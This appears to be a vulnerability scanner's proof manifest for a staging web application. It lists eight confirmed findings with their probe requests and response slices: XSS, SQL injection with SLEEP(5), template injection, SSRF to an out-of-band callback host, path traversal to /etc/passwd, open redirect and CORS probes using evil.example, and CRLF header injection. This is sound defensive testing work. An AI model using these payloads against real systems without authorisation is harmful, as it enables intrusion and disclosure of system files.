# TSMSS Verification Proof Manifest
**Scan ID:** `staging_scan_001`  
**Generated:** `2026-11-02T08:44:53.466752+00:00`  
**Total Confirmed Artifacts:** 8

| Finding ID | Severity | Confidence | Title | Oracle | SHA-256 | Artifacts |
|---|---|---|---|---|---|---|
| `XSS-MARKUP-001` | **HIGH** | `CONFIRMED` | Reflected Cross-Site Scripting (DOM Instantiation Proven) | Unescaped <b> DOM element execution + document.querySelector('b') positive | `88307776293e...` | [`request.txt`](file:///C:/Users/USER X/Desktop/TSMSS/evidence/art/staging_scan_001/XSS-MARKUP-001/request.txt) [`response_slice.txt`](file:///C:/Users/USER X/Desktop/TSMSS/evidence/art/staging_scan_001/XSS-MARKUP-001/response_slice.txt) [`xss_dom_confirmed.png`](file:///C:/Users/USER X/Desktop/TSMSS/evidence/art/staging_scan_001/XSS-MARKUP-001/xss_dom_confirmed.png) |
| `SQLI-TIME-002` | **CRITICAL** | `CONFIRMED` | Time-Based Blind SQL Injection (SLEEP 5s Delta Confirmed) | Time-delay differential: 3 consecutive runs, median delta 5.12s >= 3.0s | `ea6929c104af...` | [`request.txt`](file:///C:/Users/USER X/Desktop/TSMSS/evidence/art/staging_scan_001/SQLI-TIME-002/request.txt) [`response_slice.txt`](file:///C:/Users/USER X/Desktop/TSMSS/evidence/art/staging_scan_001/SQLI-TIME-002/response_slice.txt) |
| `SSTI-TWIG-003` | **CRITICAL** | `CONFIRMED` | Server-Side Template Injection (Twig Engine Confirmed) | Mathematical evaluation baseline-diff ({{7*7}} -> 49) + string multiplier probe (7777777) | `70d454b81a1c...` | [`request.txt`](file:///C:/Users/USER X/Desktop/TSMSS/evidence/art/staging_scan_001/SSTI-TWIG-003/request.txt) [`response_slice.txt`](file:///C:/Users/USER X/Desktop/TSMSS/evidence/art/staging_scan_001/SSTI-TWIG-003/response_slice.txt) |
| `SSRF-OOB-004` | **HIGH** | `CONFIRMED` | Blind Server-Side Request Forgery (Out-Of-Band DNS/HTTP Callback) | Interactsh out-of-band interaction oracle (DNS + HTTP queries received) | `050c17f309f1...` | [`request.txt`](file:///C:/Users/USER X/Desktop/TSMSS/evidence/art/staging_scan_001/SSRF-OOB-004/request.txt) [`response_slice.txt`](file:///C:/Users/USER X/Desktop/TSMSS/evidence/art/staging_scan_001/SSRF-OOB-004/response_slice.txt) |
| `TRAVERSAL-LFI-005` | **HIGH** | `CONFIRMED` | Path Traversal / Local File Inclusion (Root Account Disclosed) | System account entry regex match (root:x:0:0) in body | `d3ac21fe5a2a...` | [`request.txt`](file:///C:/Users/USER X/Desktop/TSMSS/evidence/art/staging_scan_001/TRAVERSAL-LFI-005/request.txt) [`response_slice.txt`](file:///C:/Users/USER X/Desktop/TSMSS/evidence/art/staging_scan_001/TRAVERSAL-LFI-005/response_slice.txt) |
| `REDIRECT-006` | **MEDIUM** | `CONFIRMED` | Open URL Redirection (Arbitrary External Destination) | HTTP 302 Location header destination != target origin (evil.example) | `97ce2ff596d7...` | [`request.txt`](file:///C:/Users/USER X/Desktop/TSMSS/evidence/art/staging_scan_001/REDIRECT-006/request.txt) [`response_slice.txt`](file:///C:/Users/USER X/Desktop/TSMSS/evidence/art/staging_scan_001/REDIRECT-006/response_slice.txt) |
| `CORS-CREDENTIALS-007` | **HIGH** | `CONFIRMED` | CORS Misconfiguration: Arbitrary Origin Allowed with Credentials | ACAO header reflection (https://evil.example) + ACAC: true | `4055dc0dd3ec...` | [`request.txt`](file:///C:/Users/USER X/Desktop/TSMSS/evidence/art/staging_scan_001/CORS-CREDENTIALS-007/request.txt) [`response_slice.txt`](file:///C:/Users/USER X/Desktop/TSMSS/evidence/art/staging_scan_001/CORS-CREDENTIALS-007/response_slice.txt) |
| `CRLF-HEADER-008` | **MEDIUM** | `CONFIRMED` | CRLF / HTTP Response Header Injection | Injected Set-Cookie header parsed as discrete header in response block | `40a3dbd061e1...` | [`request.txt`](file:///C:/Users/USER X/Desktop/TSMSS/evidence/art/staging_scan_001/CRLF-HEADER-008/request.txt) [`response_slice.txt`](file:///C:/Users/USER X/Desktop/TSMSS/evidence/art/staging_scan_001/CRLF-HEADER-008/response_slice.txt) |

## Detailed Proof Artifacts

### Finding `XSS-MARKUP-001`: Reflected Cross-Site Scripting (DOM Instantiation Proven)
- **Target:** `https://staging.internal.tsmss.local/search?q=%22%3E%3Cb%3Ezz112233%3C%2Fb%3E`
- **Severity:** `HIGH` | **Confidence:** `CONFIRMED`
- **Verification Oracle:** Unescaped <b> DOM element execution + document.querySelector('b') positive
- **Timestamp:** `2026-11-02T08:44:53.453596+00:00` | **Tool Version:** `tsmss-2.0-verify`
- **Response Full SHA-256:** `88307776293e3a8e80ddd91daf951848de88d345b6186a2216e916daecffb321`

**Request Dump:**
```http
> GET /search?q=%22%3E%3Cb%3Ezz112233%3C%2Fb%3E HTTP/1.1
> Host: staging.internal.tsmss.local
> User-Agent: TSMSS/2.0-verify

```

**Response Slice (1KB Oracle Window):**
```html
<p>You searched for: "><b>zz112233</b></p>
```

**Attached Evidence Media:**
- `file:///C:/Users/USER X/Desktop/TSMSS/evidence/art/staging_scan_001/XSS-MARKUP-001/xss_dom_confirmed.png`

---

### Finding `SQLI-TIME-002`: Time-Based Blind SQL Injection (SLEEP 5s Delta Confirmed)
- **Target:** `https://staging.internal.tsmss.local/items?id=1+AND+SLEEP(5)`
- **Severity:** `CRITICAL` | **Confidence:** `CONFIRMED`
- **Verification Oracle:** Time-delay differential: 3 consecutive runs, median delta 5.12s >= 3.0s
- **Timestamp:** `2026-11-02T08:44:53.457702+00:00` | **Tool Version:** `tsmss-2.0-verify`
- **Response Full SHA-256:** `ea6929c104af1139ec6f70864e94b27a2f58f4750d7a1a738c3ed3f36b7c9251`

**Request Dump:**
```http
> GET /items?id=1+AND+SLEEP(5) HTTP/1.1
> Host: staging.internal.tsmss.local
> User-Agent: TSMSS/2.0-verify

```

**Response Slice (1KB Oracle Window):**
```html
{"status": "ok", "items": [{"id": 1, "name": "Widget"}]}
```


---

### Finding `SSTI-TWIG-003`: Server-Side Template Injection (Twig Engine Confirmed)
- **Target:** `https://staging.internal.tsmss.local/template?tpl=%7B%7B7*7%7D%7D`
- **Severity:** `CRITICAL` | **Confidence:** `CONFIRMED`
- **Verification Oracle:** Mathematical evaluation baseline-diff ({{7*7}} -> 49) + string multiplier probe (7777777)
- **Timestamp:** `2026-11-02T08:44:53.458771+00:00` | **Tool Version:** `tsmss-2.0-verify`
- **Response Full SHA-256:** `70d454b81a1c6c21db0a1fcf58d0d48ee46bdd1cab33983ef2e3775ae9ec2b74`

**Request Dump:**
```http
> GET /template?tpl=%7B%7B7*7%7D%7D HTTP/1.1
> Host: staging.internal.tsmss.local
> User-Agent: TSMSS/2.0-verify

```

**Response Slice (1KB Oracle Window):**
```html
<html><body>Rendered: 49</body></html>
```


---

### Finding `SSRF-OOB-004`: Blind Server-Side Request Forgery (Out-Of-Band DNS/HTTP Callback)
- **Target:** `https://staging.internal.tsmss.local/proxy?url=http%3A%2F%2Fstaging.oob.interactsh.com%2Fprobe`
- **Severity:** `HIGH` | **Confidence:** `CONFIRMED`
- **Verification Oracle:** Interactsh out-of-band interaction oracle (DNS + HTTP queries received)
- **Timestamp:** `2026-11-02T08:44:53.459811+00:00` | **Tool Version:** `tsmss-2.0-verify`
- **Response Full SHA-256:** `050c17f309f1d05141741977851b50cd015621d711d43ac4aa41498bee3a32f0`

**Request Dump:**
```http
> GET /proxy?url=http%3A%2F%2Fstaging.oob.interactsh.com%2Fprobe HTTP/1.1
> Host: staging.internal.tsmss.local
> User-Agent: TSMSS/2.0-verify

```

**Response Slice (1KB Oracle Window):**
```html
{"status": "fetched"}
```


---

### Finding `TRAVERSAL-LFI-005`: Path Traversal / Local File Inclusion (Root Account Disclosed)
- **Target:** `https://staging.internal.tsmss.local/view?file=..%2f..%2f..%2f..%2fetc%2fpasswd`
- **Severity:** `HIGH` | **Confidence:** `CONFIRMED`
- **Verification Oracle:** System account entry regex match (root:x:0:0) in body
- **Timestamp:** `2026-11-02T08:44:53.461070+00:00` | **Tool Version:** `tsmss-2.0-verify`
- **Response Full SHA-256:** `d3ac21fe5a2a30c3e8a5608cb0a00179df0c4baf95d2a6755b401aeb0ba50028`

**Request Dump:**
```http
> GET /view?file=..%2f..%2f..%2f..%2fetc%2fpasswd HTTP/1.1
> Host: staging.internal.tsmss.local
> User-Agent: TSMSS/2.0-verify

```

**Response Slice (1KB Oracle Window):**
```html
root:x:0:0:root:/root:/bin/bash

```


---

### Finding `REDIRECT-006`: Open URL Redirection (Arbitrary External Destination)
- **Target:** `https://staging.internal.tsmss.local/login?redirect=https%3A%2F%2Fevil.example`
- **Severity:** `MEDIUM` | **Confidence:** `CONFIRMED`
- **Verification Oracle:** HTTP 302 Location header destination != target origin (evil.example)
- **Timestamp:** `2026-11-02T08:44:53.462289+00:00` | **Tool Version:** `tsmss-2.0-verify`
- **Response Full SHA-256:** `97ce2ff596d7dc6498d115efce333234aa26789dc6f4747711df2751b6783614`

**Request Dump:**
```http
> GET /login?redirect=https%3A%2F%2Fevil.example HTTP/1.1
> Host: staging.internal.tsmss.local
> User-Agent: TSMSS/2.0-verify

```

**Response Slice (1KB Oracle Window):**
```html
Location: https://evil.example

```


---

### Finding `CORS-CREDENTIALS-007`: CORS Misconfiguration: Arbitrary Origin Allowed with Credentials
- **Target:** `https://staging.internal.tsmss.local/api/user/me`
- **Severity:** `HIGH` | **Confidence:** `CONFIRMED`
- **Verification Oracle:** ACAO header reflection (https://evil.example) + ACAC: true
- **Timestamp:** `2026-11-02T08:44:53.463780+00:00` | **Tool Version:** `tsmss-2.0-verify`
- **Response Full SHA-256:** `4055dc0dd3ece5bfd016ed86d0658e7b4966cfe0779047e4f1bf82e49f55d44f`

**Request Dump:**
```http
> GET /api/user/me HTTP/1.1
> Host: staging.internal.tsmss.local
> Origin: https://evil.example
> Cookie: session_id=s3cr3t

```

**Response Slice (1KB Oracle Window):**
```html
Access-Control-Allow-Origin: https://evil.example
Access-Control-Allow-Credentials: true

```


---

### Finding `CRLF-HEADER-008`: CRLF / HTTP Response Header Injection
- **Target:** `https://staging.internal.tsmss.local/item?id=%0d%0aSet-Cookie:zz_crlf=1`
- **Severity:** `MEDIUM` | **Confidence:** `CONFIRMED`
- **Verification Oracle:** Injected Set-Cookie header parsed as discrete header in response block
- **Timestamp:** `2026-11-02T08:44:53.465536+00:00` | **Tool Version:** `tsmss-2.0-verify`
- **Response Full SHA-256:** `40a3dbd061e156def2a59779501a52d6fd19fee5c8e12c9fd8f13d5112291a90`

**Request Dump:**
```http
> GET /item?id=%0d%0aSet-Cookie:zz_crlf=1 HTTP/1.1
> Host: staging.internal.tsmss.local

```

**Response Slice (1KB Oracle Window):**
```html
Set-Cookie: zz_crlf=1

```


---

